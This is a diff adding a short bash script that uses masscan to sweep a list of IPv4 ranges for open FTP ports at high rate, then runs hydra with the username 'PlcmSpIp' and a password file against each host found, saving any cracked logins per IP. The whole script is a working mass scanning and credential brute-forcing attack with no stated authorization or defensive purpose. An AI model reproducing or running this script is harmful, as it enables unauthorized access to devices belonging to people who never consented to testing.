@@ -1,0 +1,20 @@
+#!/bin/bash
+
+# Scan IPv4 range on port 21
+echo -e "\nStart scanning ...\n"
+
+masscan -iL rangeIP -p21 --exclude 255.255.255.255 --rate=50000 --wait 0 | awk '{print $6}' > result.txt
+
+echo -e "\nEnding scanning !\n"
+
+# Brute force
+echo -e "\nStart brute force ...\n"
+IFS=$'\n'
+for ip in $(cat result.txt)
+do
+
+	hydra -l PlcmSpIp -P passwords.txt -t 500 ftp://$ip | grep "ftp" | grep -v "ftp://" | awk '{print $3, $5, $7}' > pal/$ip.pal
+
+done
+
+exit 0
